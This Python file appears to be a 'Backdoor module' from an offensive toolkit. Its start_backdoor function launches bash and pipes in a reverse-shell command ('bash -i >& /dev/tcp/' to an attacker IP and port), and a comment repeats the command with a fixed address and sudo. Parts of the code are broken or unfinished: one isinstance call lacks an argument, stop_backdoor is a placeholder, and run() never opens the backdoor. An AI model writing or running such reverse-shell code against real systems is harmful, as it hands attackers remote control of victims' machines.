###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import subprocess


###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################


# run commands inside an opened shell
def run_command(process, command):
    process.stdin.write(command.encode())
    process.stdin.flush()  # Ensure the command is sent


# Opens a backdoor with the attacker's machine
def start_backdoor(atk_ip, atk_port):
    if isinstance(atk_ip) == isinstance(None):
        print("No IP address was provided for Backdoor module, exiting.")
        return
    else:
        try:
            # create shell
            process = subprocess.Popen(
                ["bash"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            run_command(process, f"bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 \n")

            # read output
            output = process.stdout.readline()
            while str(output.strip()) != "b'exit'":
                print(output.strip())
                output = process.stdout.readline()

            # close process
            process.stdin.close()
            process.terminate()
            process.wait(timeout=1)
            is_root = True
        except RuntimeError:
            print("An error occured during exploitation...")
    # sudo bash -i >& /dev/tcp/192.168.1.146/4444 0>&1

    return


# Closes the backdoor with the attacker's machine
def stop_backdoor(attacker_ip=None):
    if type(attacker_ip) == type(None):
        return

    # PLACE CODE HERE...

    return


###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################


def run():
    success = False
    print("[+] Backdoor module activated!")
    # code ...
    success = True
    return success
